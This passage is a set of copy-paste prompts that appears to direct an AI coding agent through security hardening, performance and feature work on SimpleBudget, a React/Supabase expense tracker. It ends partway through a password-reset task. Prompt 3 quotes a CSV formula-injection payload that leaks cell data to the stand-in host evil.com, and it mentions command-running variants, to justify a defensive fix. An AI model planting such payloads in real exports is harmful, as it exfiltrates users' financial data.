# SimpleBudget — Execution Prompts

Copy-paste prompts for each phase. Each is **self-contained**: paste one into a fresh session and it
carries all the context needed to execute without re-discovery.

---

## Shared context (baked into every prompt below)

| Fact | Value |
|---|---|
| Repo | `patelVasu27/budget_tracker` — "SimpleBudget" |
| Stack | React 18 + TypeScript 5 + Tailwind 3 + Vite 5, Supabase (Postgres + Auth + RLS), Vercel |
| Node / build | Node 20, `npm ci`, `tsc && vite build` |
| Verify | `npx tsc --noEmit` and `npx vitest run` |
| Tables | `transactions`, `monthly_settings`, `categories`, `category_groups` |
| Supabase surface | Only 6 files touch it: `src/lib/supabase.ts`, `src/stores/authStore.ts`, `src/features/Dashboard.tsx`, `src/components/AddExpenseModal.tsx`, `src/components/ExportModal.tsx`, `src/hooks/useCategories.ts` |
| Supabase features used | Auth (email+password) + plain table CRUD. **No** realtime, RPC, storage, or edge functions. |
| RLS status | **Owner confirmed: enabled on all 4 tables.** |
| Supabase MCP | **Connected.** I can inspect live tables, RLS policies, indexes, migrations, and create dev branches directly. |
| Agent-skills | **Installed.** Supabase best-practice guidance is available. |
| Existing tests | Only `src/hooks/useAmountParser.test.ts`, `src/lib/categoryMatcher.test.ts` |
| Baseline bundle | `821.79 kB` raw / **`249.60 kB` gzip**, single chunk, no code splitting |
| Images | `public/logo.png` + `public/favicon.png` are **byte-identical**, 1408×768, 1561 KB each = **3.0 MB** |

### Product constraints (do not violate)

1. **Supabase STAYS.** This was evaluated and rejected as a rewrite. Do not migrate off Postgres/Auth.
2. **Solo maintainer, $0 budget.** No new paid services. Vercel Hobby + Supabase free tier only.
3. **Target audience: older/non-technical users AND many users.** Prioritize recovery, clarity, load speed.
4. **Do not break:** guest mode (localStorage), voice entry, CSV/XLSX export, dark mode, keyboard nav, a11y labels.
5. **Do not change** the visual design or component structure unless the prompt says to.

### Danger warning

`main` **auto-deploys to Vercel production on every push** (`.github/workflows/ci.yml:32-39`), and dev +
prod currently share **one** Supabase project. Work on a feature branch. Do not push to `main` until
verified.

---

# PROMPT 1 — Preflight & Baseline

```text
You are working on SimpleBudget, a React 18 + TypeScript + Vite expense tracker (repo: patelVasu27/budget_tracker).
Supabase (Postgres + Auth + RLS) is the backend, deployed to Vercel. Solo maintainer, $0 budget.

TASK: Establish a verified baseline. MAKE NO CODE CHANGES. This is a read-only measurement pass.

Steps:
1. Confirm clean tree: run `git status` and `git log --oneline -5`. Report the current commit SHA.
2. Install deps: `npm install`
3. Typecheck: `npx tsc --noEmit` — report pass/fail and any pre-existing errors (do NOT fix them, just record them).
4. Test: `npx vitest run` — report the pass/fail/skip counts.
5. Build: `npm run build` — record the EXACT reported size for the JS chunk and the CSS chunk, both raw and gzip.
   Expected baseline: JS 821.79 kB raw / 249.60 kB gzip, CSS 39.65 kB raw / 6.90 kB gzip.
6. Audit: `npm audit` — summarize by severity. Known unfixable finding: `xlsx` (HIGH,
   GHSA-4r6h-8v6p-xvw6 prototype pollution CVSS 7.8, GHSA-5pgg-2g8v-p4x9 ReDoS CVSS 7.5,
   `fixAvailable: false`, no patched version exists on npm).
7. Confirm no secrets are tracked: `git ls-files | Select-String -Pattern "env|secret|key|credential"`.
   Expected ONLY: `.env.example`, `src/vite-env.d.ts`. Report anything else immediately and STOP.
8. Image bloat: confirm `public/logo.png` and `public/favicon.png` are byte-identical 1408x768 ~1561 KB files
   (md5 prefix 6AC55503F3F). Report actual byte sizes of everything in `public/`.
9. Confirm `vercel.json` has no `headers` block and `index.html` has no CSP meta tag.
10. Write your findings to `docs/BASELINE.md` as a markdown table so later phases can diff against it.

DELIVERABLE: `docs/BASELINE.md` with the committed-to comparison numbers + a short list of any
pre-existing problems you found but did NOT fix.
RULES: Do not modify any file except creating `docs/BASELINE.md`. Do not fix anything you find — just report it.
```

---

# PROMPT 2 — Security Headers & Clickjacking

```text
You are working on SimpleBudget, a React 18 + TypeScript + Vite expense tracker (repo: patelVasu27/budget_tracker).
Supabase backend, deployed to Vercel. Target users include older, non-technical people.

BACKGROUND: A security audit found that `vercel.json` contains ONLY framework/buildCommand/outputDirectory/
installCommand. There is **no `headers` block**, and `index.html` has **no CSP meta tag**. Therefore the
production site currently ships NO Content-Security-Policy, NO frame-ancestors/X-Frame-Options,
NO Referrer-Policy, NO Permissions-Policy, and NO X-Content-Type-Options.

RISK: Clickjacking. Any external site can iframe SimpleBudget full-screen and overlay transparent UI on
top of the "Add Transaction" button or the voice microphone button. A user thinks they are using the
expense tracker but is clicking attacker-controlled targets. Against an older-user demographic this is
a realistic, low-skill attack.

TASK: Add a production-grade `headers` configuration to `vercel.json`.

Requirements:
1. Apply headers to ALL routes via a `source: "/(.*)"` rule.
2. Content-Security-Policy must include, at minimum:
   - `default-src 'self'`
   - `script-src 'self'` (Vite emits module scripts from same origin; if a hash/whitelist is needed,
     verify empirically rather than adding `'unsafe-inline'` blindly)
   - `style-src 'self' 'unsafe-inline'` (Tailwind injects a stylesheet; required unless you verify otherwise)
   - `img-src 'self' data:`
   - `font-src 'self'`
   - `connect-src 'self' https://*.supabase.co wss://*.supabase.co`
     (the app uses Supabase REST + WebSocket auth channel)
   - `object-src 'none'`
   - `base-uri 'self'`
   - `form-action 'self'`
   - `frame-ancestors 'none'`
   - `upgrade-insecure-requests`
3. Add these as separate header entries:
   - `X-Content-Type-Options: nosniff`
   - `Referrer-Policy: strict-origin-when-cross-origin`
   - `X-Frame-Options: DENY`
   - `Permissions-Policy: camera=(), geolocation=(), microphone=(self)` — note the app DOES use the
     microphone for voice entry, so microphone must remain permitted for same-origin.
4. Do NOT remove or rewrite the existing framework/buildCommand/outputDirectory/installCommand keys.
5. Commit the work on a feature branch. Do NOT push to main.

VERIFICATION (must all pass before you report done):
- `npx tsc --noEmit` passes.
- `npm run build` passes.
- Confirm the headers are syntactically valid JSON: `node -e "JSON.parse(require('fs').readFileSync('vercel.json','utf8'))"`
- Explicitly document in your final message any CSP directive you could not verify locally, and state that
  the real test is loading the deployed site in a browser console and checking for CSP violation errors.

CAUTION: A too-strict CSP can silently break Supabase auth or the app's own scripts. If you are unsure
whether a directive is required, explain the tradeoff to me rather than guessing. Report the final
`headers` block you wrote, in full.
```

---

# PROMPT 3 — Authorization Hardening, Export Injection, Image Bloat

```text
You are working on SimpleBudget, a React 18 + TypeScript + Vite expense tracker (repo: patelVasu27/budget_tracker).
Supabase (Postgres + Auth + RLS) backend, Vercel-hosted. RLS is confirmed enabled on all 4 tables.

BACKGROUND: A security audit found three independent issues. Fix all three in this task.

=== ISSUE A: IDOR pattern — mutations identify rows by primary key only ===

These queries do NOT filter by `user_id`, so they are currently protected ONLY by RLS. If any RLS policy
is ever dropped during a migration, any authenticated user could modify or delete another user's
financial records by supplying a known UUID.

Locations (verify exact line numbers, they may have shifted):
- `src/features/Dashboard.tsx:225`        — `supabase.from('transactions').delete().eq('id', id)`
- `src/features/Dashboard.tsx:188-191`    — `supabase.from('monthly_settings').update({...}).eq('id', settings.id)`
- `src/components/AddExpenseModal.tsx:246` — `supabase.from('transactions').update({...}).eq('id', data.id)`
- `src/hooks/useCategories.ts:200`        — `.update(data).eq('id', categoryId)`
- `src/hooks/useCategories.ts:227`        — `.delete().eq('id', categoryId)`
- `src/hooks/useCategories.ts` around lines 257-321 — the category_groups mutations; audit these yourself,
  they follow the same pattern.

FIX: append `.eq('user_id', user.id)` to every mutation above (pass the real signed-in user id through
however the surrounding code already does — several of these hooks receive a `userId` parameter already).

Do NOT change any SELECT queries — those already filter correctly.

=== ISSUE B: CSV / Excel formula injection (CWE-1236) ===

`src/lib/export.ts:4-11` defines `escapeCSV`, which correctly handles commas, quotes and newlines but does
NOT neutralize values beginning with `=`, `+`, `-`, `@`, TAB, or CR.

Impact: a transaction note such as `=HYPERLINK("http://evil.com?x="&A1,"Click")` executes when the user
opens the exported CSV in Excel. On Windows, `=cmd|...` variants can execute commands. The XLSX path
(`export.ts:76-82`, `generateXLSX`) writes raw values and has the same problem.

FIX:
- In `escapeCSV`, prefix any string whose first character is one of `= + - @ \t \r` with a single quote
  (`'`) before any quoting/escaping is applied. Do this inside the existing function so both CSV and any
  future caller benefit.
- Apply the same neutralization to the XLSX data path in `generateXLSX`.
- Write Vitest unit tests in `src/lib/export.test.ts` covering: a note starting with `=`, one starting with
  `+`, one with `-`, one with `@`, a leading tab, a normal note (must be untouched), and a value containing
  a comma + quote together (must still round-trip correctly).

=== ISSUE C: Image bloat ===

`public/logo.png` and `public/favicon.png` are BYTE-IDENTICAL duplicates. Both are 1408x768 and ~1561 KB,
so 3.0 MB total. The logo is rendered at 80x80 (`src/App.tsx:90`) and 36x36 (`src/features/Dashboard.tsx:312`).
3.0 MB is roughly 12x the gzipped JS bundle and is the single largest page-weight problem in the app.

FIX:
- Produce ONE appropriately sized image. Requirements: maximum 256x256 px (square, letterboxed on a
  neutral background if the source is not square), visually identical to the current artwork, saved as both
  `.png` and `.webp` (webp substantially smaller).
- Keep one file usable as the favicon so `<link rel="icon">` and `apple-touch-icon` in `index.html` both work.
- Update `index.html` references if the filenames change.
- Verify the rendered logo still looks correct at both 80px and 36px.

VERIFICATION (all must pass):
- `npx tsc --noEmit` passes.
- `npx vitest run` passes AND includes your new `src/lib/export.test.ts`.
- `npm run build` passes.
- Report the before/after byte size of the images.

RULES: Work on a feature branch. Do not push to main. Do not change RLS policies or SQL files in this task.
Report anything you find but did not fix.

ADDITIONAL (now possible via MCP): Before starting, use Supabase MCP to verify the LIVE RLS policies on
all 4 tables match `supabase/rls-only.sql`. If they differ, report the drift before making any changes.
```

---

# PROMPT 4 — Phase 0: Safety Net

```text
You are working on SimpleBudget, a React 18 + TypeScript + Vite expense tracker (repo: patelVasu27/budget_tracker).
Supabase (Postgres + Auth + RLS) backend, deployed to Vercel via GitHub Actions. Solo maintainer, $0 budget.

BACKGROUND — WHY THIS PHASE EXISTS:
`.env.example` states: "single project for dev and production (D-25)". Dev and production currently share ONE
Supabase project. Meanwhile `.github/workflows/ci.yml:32-39` deploys to Vercel **production** on every single
push to `main`. Schema changes are applied by hand in the Supabase SQL editor (`supabase/schema.sql:2`
instructs this). There is no staging, no migration gate, and no rollback.

This is the single most probable real-world incident for this project — far more likely than any attacker.
One typo in a manually-applied migration destroys live user data, and nothing in the pipeline stops you.

TASK — two parts.

=== PART 1: Documentation + guardrails (do this first, it is safe) ===

1. Create `.env.development.example` documenting the DEV Supabase project, and update `.env.example` so it
   no longer claims a single shared project.
2. Update the header comment in `supabase/schema.sql` and `supabase/rls-only.sql` to state loudly that
   these scripts must NEVER be run against the production project, and must be applied to dev first.
3. Fix a latent bug while you are in there: `supabase/schema-v2-categories.sql` declares
   `UNIQUE(user_id, LOWER(name))` inline at line 30 AND adds a second identical constraint
   `unique_user_category_name` at line 235. Running the file twice therefore errors. Make it idempotent
   (guard the ALTER TABLE, e.g. with a `DO $$ ... IF NOT EXISTS` block or `DROP CONSTRAINT IF EXISTS` first)
   so re-running is safe.
4. Create `docs/SUPABASE.md` documenting: the two-project model, the exact order to apply
   schema.sql / schema-v2-categories.sql / rls-only.sql, and the rollback story.

=== PART 2: CI deploy gate ===

5. Modify `.github/workflows/ci.yml` so that production deploy requires an EXPLICIT manual approval.
   Use the `environment:` key with a Vercel production environment configured to require reviewers, OR
   switch the deploy step to `workflow_dispatch`-only. Do NOT auto-deploy on every push to main.
6. Add a `npm audit --audit-level=critical` step that fails the pipeline on critical findings.
   NOTE: `xlsx` currently reports HIGH with `fixAvailable: false` — do not let this block CI; only gate
   on `critical`.
7. Keep the existing TypeScript check and test steps working exactly as they are.

PART 2 CONSTRAINT: Supabase MCP is now connected, so I CAN create dev branches and inspect the live
project directly. Vercel environment protection still needs manual dashboard setup. So:
- Use Supabase MCP to create a dev branch (`create_branch`) and verify the current project's
  tables, RLS policies, indexes, and migration history BEFORE writing any changes.
- Apply schema changes to the DEV branch only, never to production. Verify with MCP that RLS is
  enabled and policies exist on the dev branch before merging.
- Write the exact SQL / migration files for the dev -> prod promotion path.
- Write precise step-by-step instructions for setting Vercel environment variables and enabling
  deployment protection on the production environment (this still requires the Vercel dashboard).
- Make the CI change degrade GRACEFULLY: if the protection is not yet configured in Vercel, the pipeline
  should fail safe (not deploy), not fail open (deploy anyway).

VERIFICATION:
- `npx tsc --noEmit` passes.
- `npx vitest run` passes.
- `npm run build` passes.
- The CI YAML is valid and the ordering of steps is correct (checkout -> setup -> install -> typecheck ->
  test -> audit -> gated deploy).
- Re-running `schema-v2-categories.sql` twice against a fresh database must not error. Explain how you
  verified this (you may use a local Postgres if available, otherwise reason it through precisely and say so).

RULES: Do not run any SQL against any remote database. Do not push to main. Do not change application
source code in this task — this phase is infrastructure only.
```

---

# PROMPT 5 — Phase 1: Bloat Removal (the big one)

```text
You are working on SimpleBudget, a React 18 + TypeScript + Vite expense tracker (repo: patelVasu27/budget_tracker).
Supabase (Postgres + Auth + RLS) backend, Vercel-hosted. Solo maintainer, $0 budget.

PRODUCT PROMISE: "Log an expense and see your remaining balance in under 5 seconds." Load speed IS the product.

CURRENT MEASURED BASELINE (from `npm run build`):
  dist/assets/index-<hash>.js    821.79 kB raw  /  249.60 kB gzip   (SINGLE chunk, zero code splitting)
  dist/assets/index-<hash>.css    39.65 kB raw  /    6.90 kB gzip
There is exactly one JS chunk. Nothing is lazily loaded. Everything ships on first paint.

Analysis of what is actually inside that bundle:
  - SheetJS (`xlsx`) ~600 kB raw — used ONLY by `src/lib/export.ts` (`generateXLSX`), which runs when the
    user clicks Export. Imported at top level (`src/lib/export.ts:1`: `import * as XLSX from 'xlsx'`).
  - `@supabase/supabase-js` — the installed dist is 192.8 kB raw. The app only uses
    `auth.signUp / signInWithPassword / signOut / getSession / onAuthStateChange` and plain
    `.from(table).select/insert/update/delete` CRUD. It does NOT use realtime, RPC, storage, or edge
    functions — yet the shipped bundle contains the Realtime WebSocket client (channels, heartbeats)
    and the full WebAuthn/passkey/SIWE code paths. All dead weight.

TASK — four parts, in order.

=== PART A: Remove the unpatchable dependency ===
`xlsx@0.18.5` has two HIGH advisories with NO fix available on npm:
  - GHSA-4r6h-8v6p-xvw6  Prototype Pollution  CVSS 7.8  (<0.19.3)
  - GHSA-5pgg-2g8v-p4x9  ReDoS                CVSS 7.5  (<0.20.2)
GitHub advisory states: "Patched versions: None ... the npm package `xlsx` is no longer maintained."

Honest context: the advisory also says workflows that WRITE spreadsheets (not read arbitrary files) are
unaffected — which is what this app does. So this is not an active exploit today. But the package is
permanently dead and unpatchable.

Do BOTH of:
  A1. Lazy-load it: convert `src/lib/export.ts` to `const XLSX = await import('xlsx')` inside
      `generateXLSX` only, so it is fetched on demand and never on initial page load. Make `generateXLSX`
      async-safe and keep its exported signature working for `src/components/ExportModal.tsx`.
      Ensure the CSV path NEVER imports it at all.
  A2. Relocate the package off npm: install the maintained build from the vendor CDN
      (`npm i https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz`) OR replace the XLSX export with a
      dependency-free writer. Explain the tradeoff and pick one. Verify `npm audit` no longer reports xlsx.

=== PART B: Replace supabase-js with a thin typed client ===
Create `src/lib/api.ts` — a small (~60-100 line), fully typed `fetch` wrapper over Supabase PostgREST +
GoTrue REST endpoints that reproduces ONLY the surface this app uses:
  - `auth.signUp`, `auth.signInWithPassword`, `auth.signOut`, `auth.getSession`,
    `auth.onAuthStateChange`
  - `.from(table).select().eq().gte().lte().order().single()`
  - `.from(table).insert()`, `.update().eq()`, `.delete().eq()`
Keep the SAME public method names and return shape (`{ data, error }`) so call sites do not change, then
migrate the 6 call sites: `src/lib/supabase.ts`, `src/stores/authStore.ts`, `src/features/Dashboard.tsx`,
`src/components/AddExpenseModal.tsx`, `src/components/ExportModal.tsx`, `src/hooks/useCategories.ts`.
Delete `@supabase/supabase-js` from `package.json` when done.

CRITICAL — do not weaken security:
  - The anon key is INTENTIONALLY public and must continue to be sent as `apikey` +
    `Authorization: Bearer <anon-key>`. That is how Supabase works. Do not "fix" this by hiding it.
  - RLS remains the authorization boundary. Keep sending the user's JWT on every request.
  - Preserve the EXACT error-message behaviour the UI depends on (AuthModal and AddExpenseModal surface
    `err.message` directly).

If this part proves too risky or too large, STOP and report back rather than shipping a half-working
replacement. A working app matters more than a small one.

=== PART C: Code splitting ===
Add `build.rollupOptions.output.manualChunks` in `vite.config.ts`. Lazy-load at minimum:
  `ExportModal`, `CategoryManager`, and the `xlsx` library.
Use `React.lazy` + `Suspense` with a sensible fallback that matches the existing loading style (there is
already a skeleton loader pattern in `Dashboard.tsx` around lines 462-475 — reuse it).

=== PART D: Report ===
Re-run `npm run build`. Report the exact new JS and CSS sizes, raw and gzip, next to the baseline above.
State clearly whether the "5 second" goal is now met on a throttled 3G connection (use a reasoned estimate
plus the actual byte counts — do not fabricate a measurement).

VERIFICATION (all must pass):
- `npx tsc --noEmit` passes with zero errors.
- `npx vitest run` passes.
- `npm run build` passes with no new warnings beyond chunk-size notices.
- `npm audit` shows no more `xlsx` findings.
- MANUAL TESTING IS MANDATORY before reporting done — walk through and confirm each still works:
  sign up, sign in, log an expense by form, log an expense BY VOICE, edit a transaction, delete a
  transaction, set base monthly income, create/rename/delete a category group, create/rename/delete a
  category, CSV export, XLSX export, sign out, guest mode from a clean profile, dark mode toggle.
  Report honestly on anything that broke. Do not claim success you did not observe.

RULES: Work on a feature branch, one commit per part (A, B, C, D) so each is revertable. Do not change
the visual design. Do not remove the guest-mode code paths. Do not push to main.
```

---

# PROMPT 6 — Cross-User Isolation Tests

```text
You are working on SimpleBudget, a React 18 + TypeScript + Vite expense tracker (repo: patelVasu27/budget_tracker).
Supabase (Postgres + Auth + RLS) backend.

BACKGROUND: This project's ENTIRE multi-tenant security model is 4 sets of Row-Level Security policies:

    CREATE POLICY "Users can view own transactions" ON public.transactions
      FOR SELECT USING (auth.uid() = user_id);

applied to `transactions`, `monthly_settings`, `categories`, `category_groups`. RLS is confirmed enabled
on all 4 tables in the live project.

The anon key is public in the client bundle (this is by design). RLS is therefore the ONLY thing preventing
one user from reading another's financial data.

THE PROBLEM: there are ZERO automated tests covering the data layer. The entire test suite is two pure-function
files (`src/hooks/useAmountParser.test.ts`, `src/lib/categoryMatcher.test.ts`). Nothing asserts that
user A cannot see user B's rows. If a policy is dropped during a manual migration, nothing detects it.

TASK: Build an integration test suite that proves isolation, and wire it into CI.

Requirements:
1. Stand up a disposable Postgres for tests with the `auth` schema shimmed so `auth.uid()` and `auth.users`
   work. Two realistic options — pick one and justify it:
     (a) Local Docker Postgres + the real Supabase/PostgREST stack.
     (b) A pure-Postgres test harness: apply `supabase/schema.sql` + `supabase/schema-v2-categories.sql`
         against a scratch database, create a minimal `auth.users` table + `auth.uid()` function that reads
         from a session variable, apply `supabase/rls-only.sql`, then run the assertions using
         `SET LOCAL role` / `SET LOCAL request.jwt.claim.sub` to impersonate different users.
   Option (b) is usually faster and has no external dependency — prefer it unless you find a blocker.
2. Write tests asserting, for EACH of the 4 tables and EACH of SELECT / INSERT / UPDATE / DELETE:
   - User A CAN read their own rows.
   - User A CANNOT read User B's rows (this is the critical assertion).
   - User A CANNOT insert a row with `user_id` set to User B (the `WITH CHECK` clause).
   - User A CANNOT update or delete User B's row.
   - An anonymous / no-JWT caller can read NOTHING from any table.
3. Add a test asserting the seeding trigger `seed_default_categories()` fires on new user creation and
   creates the expected default groups and categories (`supabase/schema-v2-categories.sql:92-135`).
4. If Docker is unavailable in the environment, make the suite SKIP GRACEFULLY with a clear console message
   rather than failing CI — but still write it fully and document exactly how to run it.
5. Add a `test:integration` script to `package.json` and wire it into `.github/workflows/ci.yml` as a
   separate step from the existing unit tests.

VERIFICATION:
- `npx vitest run` (unit) still passes.
- `npm run test:integration` passes locally, OR skips cleanly with the documented instruction if no DB is available.
- `npx tsc --noEmit` passes.
- Deliberately BREAK one RLS policy locally (e.g. drop the `transactions` SELECT policy), confirm the test
  suite FAILS, then restore it and confirm it passes again. Report this proof explicitly — a test suite
  that cannot detect a broken policy is worthless.

RULES: NEVER run these tests against the production Supabase project. Use a Supabase dev branch
(created via MCP `create_branch`) or a local Postgres. Never commit credentials. Never push to main.

ADDITIONAL (now possible via MCP): Before writing the test suite, use Supabase MCP to inspect the LIVE
project's actual RLS policies on all 4 tables. Compare them against `supabase/rls-only.sql` and
`supabase/schema-v2-categories.sql` and report any drift (e.g. policies that exist in the DB but not
in the SQL files, or vice versa). This is the single most valuable thing MCP unlocks for this phase.
```

---

# PROMPT 7 — Phase 2: Unify the Data Layer

```text
You are working on SimpleBudget, a React 18 + TypeScript + Vite expense tracker (repo: patelVasu27/budget_tracker).
Supabase backend. Product decision made: Supabase STAYS; we are not migrating off it.

BACKGROUND — WHY THIS PHASE EXISTS:
Every single data operation in this app branches on an `isGuest` flag to choose between localStorage and
Supabase. This dual-path pattern is duplicated across roughly 40 call sites in 4 files:
  - `src/features/Dashboard.tsx`        (monthly settings read/write, transactions read/delete)
  - `src/components/AddExpenseModal.tsx` (transactions add/edit)
  - `src/components/ExportModal.tsx`    (transactions read for export)
  - `src/hooks/useCategories.ts`        (categories + category_groups read/create/update/delete)
Each site re-implements the same `if (isGuest) { localStorage... } else { supabase... }` branching.
This is the main reason the codebase feels risky to change, and it is the single biggest maintainability
problem in the project.

TASK: Refactor to ONE async interface with two implementations.

Design:
1. Define a `DataStore` interface covering every data operation the app performs:
   listTransactions / getMonthlySettings / upsertMonthlyIncome / addTransaction / updateTransaction /
   deleteTransaction / listCategories / listCategoryGroups / createCategory / updateCategory /
   deleteCategory / createCategoryGroup / updateCategoryGroup / deleteCategoryGroup.
   Keep it small and honest — do not add speculative methods.
2. Implement `LocalStore` (localStorage, preserving the EXACT existing key names and payload shapes:
   `guest_transactions`, `guest_settings_<year>_<month>`, `guest_categories`,
   `guest_category_groups`, `guest_initialized`, and the 3-row default seed data in `Dashboard.tsx:95-128`).
3. Implement `RemoteStore` (whatever backend client exists after Prompt 5 — do not assume; read the code).
4. Provide a factory that selects the store once at app start based on auth state.
5. Rewrite all ~40 call sites to use the injected store with NO branching in components or hooks.

HARD CONSTRAINTS:
- Behaviour must be byte-for-byte equivalent. Same data, same keys, same defaults, same ordering
  (`Dashboard.tsx:144-148` sorts by date desc then created_at desc).
- Guest mode must keep working exactly as today, including the seeded sample data on first run.
- Do NOT add a "merge my guest data into my account" feature in this task. Note it as a follow-up
  opportunity only — it is a genuinely good feature but it is out of scope and adds risk.
- React Query keys must remain stable so caching behaviour is unchanged.

PROCESS (follow this order):
- Step 1: write the interface + both implementations + factory. Do not touch call sites yet.
- Step 2: run `npx tsc --noEmit` and `npx vitest run`. Commit.
- Step 3: migrate call sites ONE FILE AT A TIME, typechecking and committing after each.
- Step 4: delete the now-dead branching code. Verify no orphaned `isGuest` data branches remain
  (grep for `guest_transactions`, `guest_categories`, `guest_settings` and confirm each hit is
  either inside `LocalStore` or a legitimate guest-mode UI affordance).

VERIFICATION:
- `npx tsc --noEmit` passes.
- `npx vitest run` passes.
- MANUAL TEST — both modes, in a clean browser profile, reporting honestly on anything broken:
  (a) GUEST: continue as guest, verify the 3 seeded rows appear, add/edit/delete a transaction,
      set income, create/edit/delete a category and a group, export CSV and XLSX.
  (b) SIGNED IN: sign up, log/edit/delete a transaction, set income, manage categories, export both formats.
  (c) Sign out and back in — data must persist.
- Report the final line count reduction and confirm the count of `if (isGuest)` occurrences dropped to
  approximately zero outside the store-selection logic.

RULES: Feature branch, one commit per step. Do not change UI. Do not push to main. If the refactor starts
producing subtle behavioural differences, STOP and report rather than pushing through — a working app
matters more than a clean architecture.
```

---

# PROMPT 8 — Month Navigation & Historical Records

```text
You are working on SimpleBudget, a React 18 + TypeScript + Vite expense tracker (repo: patelVasu27/budget_tracker).
Supabase (Postgres + Auth + RLS) backend, Vercel-hosted. Solo maintainer, $0 budget.
Product promise: "Log an expense and see your remaining balance in under 5 seconds."

RUN THIS AFTER PROMPT 7 (data layer unification). That is a hard dependency — do not attempt this
before the DataStore interface exists, or you will be re-wiring the same dual-path branching in
Dashboard.tsx, AddExpenseModal.tsx, ExportModal.tsx, and useCategories.ts all over again.

BACKGROUND: Today the app is LOCKED to the current calendar month. `src/features/Dashboard.tsx:35-36`
hard-codes:
    const currentMonth = new Date().getMonth() + 1
    const currentYear = new Date().getFullYear()
Every query filters to that exact window (Dashboard.tsx:154-164, ExportModal.tsx:75-81, and the guest
branch). There is NO month picker, NO month navigation, and NO way to view a previous month's records
inside the app. This is a critical gap — without it the app is a note-taking tool, not a budget tracker.

WHAT THE USER NEEDS:
- Navigate to any previous (or future) month and see the transactions, income, and balance for THAT month.
- See the monthly income setting for that month (or 0 if none was set).
- Export any month's data (ExportModal already accepts dateFrom/dateTo — just pass the selected month's range).
- Jump back to "today" with one tap.
- Keep all existing behaviour: guest mode, voice entry, dark mode, a11y, keyboard nav.

TASK — four parts.

=== PART A: Month state & navigation UI ===

1. Introduce `selectedMonth` (1-12) and `selectedYear` state in `Dashboard`, defaulting to today.
   Do NOT mutate `currentMonth`/`currentYear` — keep those as "today" constants for the "jump to today"
   button and for the header's default view.
2. Replace the static subtitle in the header (`Dashboard.tsx` around the `<p>` that renders
   `format(new Date(), 'MMMM yyyy')`) with a month navigator:
   - A `<` button (aria-label "Previous month") and a `>` button (aria-label "Next month") stepping
     one month at a time, with year rollover at December <-> January.
   - The display text: `format(new Date(selectedYear, selectedMonth - 1), 'MMMM yyyy')`.
   - A "Today" button (aria-label "Jump to current month") that resets selectedMonth/selectedYear to
     today. Only show it when the user is NOT already on the current month.
3. Use the EXISTING button styling (`btn-primary`, `btn-secondary`) and the existing tooltip pattern
   (`src/components/Tooltip.tsx`). Do not invent new visual language.
4. All buttons must be keyboard-operable (Enter/Space) and have visible focus rings. Match the existing
   a11y standard in the codebase (see `Dashboard.tsx:385-401` for the established pattern).

=== PART B: Data fetching for the selected month ===

5. Update the React Query keys to include the selected month/year:
   `['transactions', userId, selectedMonth, selectedYear]` and
   `['monthlySettings', userId, selectedMonth, selectedYear]`.
   This gives you FREE per-month caching — navigating back to a month you already viewed is instant.
6. Update the Supabase transaction query to filter between the first and last day of the selected month
   (compute with `date-fns` `startOfMonth` / `endOfMonth`, or equivalent).
7. Update the Supabase monthly_settings query to filter by the selected month/year.
   If no settings row exists for that month, income defaults to 0. Do NOT auto-insert a row for a
   month the user never visited — that pollutes the database with empty rows.
8. Keep the existing sort order: date desc, then created_at desc.
9. The "Add Transaction" form should default its `date` field to today (NOT the selected month) unless
   the user is currently viewing the current month. Reason: an older user navigating to March to
   review should not accidentally create a transaction dated in March. This is a real footgun.

=== PART C: Guest mode parity ===

10. Filter `guest_transactions` client-side by the selected month (same pattern as the current
    `Dashboard.tsx:135-142` filter, but using selectedMonth/selectedYear instead of currentYear/currentMonth).
11. Guest settings key: `guest_settings_${selectedYear}_${selectedMonth}`.
12. The 3-row seed data in `Dashboard.tsx:95-128` should ONLY seed when the user is on the current month
    AND has no data. Do not seed into past months.

=== PART D: Export integration ===

13. `ExportModal` already accepts `dateFrom`/`dateTo`. When the user opens Export while viewing a
    non-current month, pre-populate the date range with that month's first and last day. Keep the
    manual override so users can still pick a custom range.

=== SCOPE CONTROL — explicitly OUT of scope ===
- NO charts or cross-month comparison (violates the design rules: "No charts or complex
  visualizations in MVP").
- NO bulk delete across months.
- NO "compare to last month" widget.
- NO new database tables or columns. This feature is purely a read-filter change.
- NO changes to the visual design language (colours, typography, spacing).

VERIFICATION (all mandatory):
- `npx tsc --noEmit` passes.
- `npx vitest run` passes.
- MANUAL TEST — report honestly on each:
  (1) Navigate to a previous month, confirm transactions and income for that month load correctly.
  (2) Navigate to a future month, confirm it shows empty state (not an error).
  (3) "Today" button returns to current month and shows current data.
  (4) Year rollover: December -> January moves to next year correctly.
  (5) Guest mode: navigate months, confirm filtering works and seed data only appears on current month.
  (6) Export while viewing a past month: date range pre-populated correctly, download works.
  (7) Add a transaction while viewing a past month — date defaults to today, not the past month.
  (8) React Query cache: navigate to a month, leave, come back — it should be instant (no network call).
- Confirm NO new SQL or schema changes were made. This is a client-only feature.
- Report any UX friction you noticed for older users (e.g. "the < > buttons are too small").

RULES: Work on a feature branch, one commit per part (A, B, C, D). Preserve the existing UI and design
language. Do not change the database schema. Do not push to main.
```

---

# PROMPT 9 — Auth Completeness (password reset, signup confirmation)

```text
You are working on SimpleBudget, a React 18 + TypeScript + Vite expense tracker (repo: patelVasu27/budget_tracker).
Supabase Auth (email + password) backend, Vercel-hosted. Target users include OLDER, NON-TECHNICAL people.

Run this AFTER the bloat-removal phase, not before.

BACKGROUND — two gaps confirmed by audit in `src/components/AuthModal.tsx`:

GAP 1 — NO PASSWORD RESET. `onSubmit` (lines 80-104) handles exactly two cases:
`supabase.auth.signInWithPassword` (line 86) and `supabase.auth.signUp` (line 92). There is no
"forgot password" flow anywhere in the codebase.
IMPACT: an older user who forgets their password is locked out of their financial data PERMANENTLY, with
no recourse. For this specific audience this is the single highest-probability cause of churn. It is a
total absence, not a bug.

GAP 2 — BROKEN SIGNUP CONFIRMATION. Line 98 calls `onSuccess()` unconditionally, immediately after
`signUp`. If email confirmation is enabled in the Supabase project, `signUp` returns NO session — the user
is not signed in — but the UI acts as though they are, and they land on the login wall with no explanation.

TASK:
1. Implement "Forgot password":
   - Uses `supabase.auth.resetPasswordForEmail(email, { redirectTo })`.
   - `redirectTo` must point to your deployed domain + an auth callback route (design this — see note below).
   - Show a clear success message: "Check your email for a reset link." Do NOT reveal whether the email
     exists (that is an account-enumeration vector and also just bad UX here).
   - Handle the error case with a plain-language message, not a raw Supabase error string.
2. Implement the reset-complete screen:
   - Detect the recovery session (Supabase delivers it in the URL fragment; the client must detect and
     handle it on app boot).
   - Let the user set a NEW password, confirm it, and validate locally (min length, match).
